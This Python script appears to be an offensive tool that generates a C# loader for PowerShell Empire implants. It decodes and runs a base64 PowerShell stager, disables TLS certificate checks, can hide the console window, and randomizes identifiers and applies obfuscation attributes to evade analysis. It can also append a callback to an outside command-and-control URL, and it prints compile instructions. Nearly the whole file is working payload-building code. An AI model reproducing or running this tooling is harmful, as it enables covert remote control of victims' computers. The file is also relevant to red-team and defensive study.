import sys
import argparse
import random

DEBUG = False
IPANDPORTURL = None
CONSOLE_WINDOW = False



def opening_banner():
    # powershell makes it look a little crunched
    ret = '''
            ,ooo888888888888888oooo,
          o8888YYYYYY77iiiiooo8888888o
         8888YYYY77iiYY8888888888888888
        [88YYY77iiY88888888888888888888]
        88YY7iYY888888888888888888888888
       [88YYi 88888888888888888888888888]
       i88Yo8888888888888888888888888888i
       i]        ^^^88888888^^^     o  [i
      oi8  i           o8o          i  8io
    ,77788o ^^  ,oooo8888888ooo,   ^ o88777,
    7777788888888888888888888888888888877777
     77777888888888888888888888888888877777
      77777788888888^7777777^8888888777777
      88888778888^7777ooooo7777^8887788888
     88888888888888888888888888888888888887
      78888887788788888^;;^888878877888887
       7888878^ ^8788^;;;;;;^878^ ^878877
         777888o8888^;ii;;ii;^888o87777
                ^8788^;;;;;;^878^
                    @vvalien1
         '''
    ret += "\n\n"
    return ret
    
def finish_csc():
    ret = """
[*] On Windows To Compile: (mind the ticks:)
--------------------------------------------
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe `
/r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll `
/res:ModifyMe.rc /out:"{0}.exe" /platform:x86 "{0}.cs"
"""
    return ret

def finish_emp():
    ret ="""
[*] On Your Empire Host Run:
----------------------------
listeners
uselistener http
set Host .
etc..
etc...
etc...."""
    return ret

def SharpRC():
    ret = '''
using System.Reflection;

[assembly: AssemblyTitle("NativeEmpire")]
[assembly: AssemblyKeyFile("")]
[assembly: AssemblyDescription("Publisher and Author: AliensOMG!")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("NativeEmpire")]
[assembly: AssemblyCopyright("Copyright 2017")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: SuppressIldasm()] // looks interstring no?
[assembly: ObfuscateAssemblyAttribute(true, StripAfterObfuscation=true)] // lol thanks MS (used externally)
// https://docs.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool
// [assembly: AssemblyKeyFileAttribute("keyfile.snk")]
'''
    return ret

def rand_str():
    ascii = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    rng = random.randrange(10,15)
    ret = ''.join(random.choice(ascii) for x in range(rng))
    return ret

def emp_key(): # empire key is 32 lower ascii and num
    asciinum = 'abcdefghijklmnopqrstuvwxyz123456789'
    ret = ''.join(random.choice(asciinum) for x in range(32))
    return ret

def random_names(mod_name = ""):
    ret = rand_str()
    if DEBUG and mod_name != "": ret = mod_name
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()

def setupCSfile(TheMoneyShot = 'AEkAbQBTAG8AcgByAHkARABhAHYAZQA='):
    NamespaceName                 = random_names("NamespaceName")
    ClassName                     = random_names("ClassName")
    RunPSName                     = random_names("RunPSName")
    CommandString                 = random_names("CommandString")
    RunspaceName                  = random_names("RunspaceName")
    ScriptInvoker                 = random_names("ScriptInvoker")
    PipelineName                  = random_names("PipelineName")
    ResultsName                   = random_names("ResultsName")
    String64                      = random_names("String64")
    NewString64                   = random_names("NewString64")
    WindowPoint                   = random_names("WindowPoint")
    WindowInt                     = random_names("WindowInt")
    ConsoleWin                    = random_names("ConsoleWindow")
    SecString  =  emp_key
    ret = "namespace %s\n{\n" % NamespaceName
    ret += " class %s\n {\n" % ClassName
    ret += "  static void %s(string %s)\n  {\n" % (RunPSName, CommandString)
    ret += "   System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\n"
    ret += "   System.Management.Automation.Runspaces.Runspace %s = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();\n" % RunspaceName
    ret += "   %s.Open();" % RunspaceName
    ret += "   System.Management.Automation.RunspaceInvoke %s = new System.Management.Automation.RunspaceInvoke(%s);\n" % (ScriptInvoker, RunspaceName)
    ret += "   System.Management.Automation.Runspaces.Pipeline %s = %s.CreatePipeline();\n" %(PipelineName, RunspaceName)
    ret += "   %s.Commands.AddScript(%s);\n" % (PipelineName, CommandString)
    ret += "   %s.Commands.Add(\"Out-String\");\n" % PipelineName
    ret += "   System.Collections.ObjectModel.Collection<System.Management.Automation.PSObject> %s = %s.Invoke();\n" % (ResultsName, PipelineName)
    ret += "   %s.Dispose();\n  }\n" % PipelineName # woopse
    ret += "  static void Main()\n  {\n"
    if CONSOLE_WINDOW:
       ret += "   System.IntPtr %s = GetConsoleWindow();\n   ShowWindow(%s, 0);\n" %(ConsoleWin, ConsoleWin)
    ret += "   string %s = \"%s\";\n" % (String64, TheMoneyShot)
    ret += "   string %s = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(%s));\n" % (NewString64, String64)
    if IPANDPORTURL:
        ret += "   %s += \"Start-Negotiate -s '%s' -SK '%s'\";\n" % (NewString64, IPANDPORTURL, SecString)
    ret += "   %s(%s);\n" %(RunPSName, NewString64)
    ret += "  }\n"
    if CONSOLE_WINDOW:
        ret += "   [System.Runtime.InteropServices.DllImport(\"kernel32\")] private static extern System.IntPtr GetConsoleWindow();\n"
        ret += "   [System.Runtime.InteropServices.DllImport(\"user32.dll\")] private static extern bool ShowWindow(System.IntPtr %s, int %s);\n" % (WindowPoint, WindowInt)
    ret += " }\n}"
    return ret

if __name__ == '__main__':
    print(opening_banner())
    usage_text = "%s http(s):\\\\<url>:<port> <output_file>\n" % (sys.argv[0])
    usage_text += "usage: %s -p <BASE64_EMPIRE_STRING> -o <OUTPUT_FILE>\n" % (sys.argv[0])
    parser = argparse.ArgumentParser(usage=usage_text)
    parser.add_argument('-d', action='store_true', default=False, dest='debug', help='Debuging')
    parser.add_argument('-p', type=str, required=False, help='B64 PS-Empire string')
    parser.add_argument('-o', type=str, required=False, help='Output File')
    parser.add_argument('-w', action='store_true', default=False, dest='window', help='Hide Console Window')
    nargs              = parser.parse_args() # all args
    if len(sys.argv) < 3 or nargs.p == None:
        parser.print_help()
        sys.exit(0)
    if nargs.p == None:
        IPANDPORTURL       = sys.argv[1]
        output_file        = sys.argv[2]
        payload            = setupCSfile()
    else:
        DEBUG              = nargs.debug
        pshell             = nargs.p
        output_file        = nargs.o
        CONSOLE_WINDOW     = nargs.window
        payload            = setupCSfile(pshell)
    write_file(output_file, payload)
    write_file("ModifyMe.rc", SharpRC())
    print(finish_csc().format(output_file.split('.')[0]))
    # print(finish_emp())
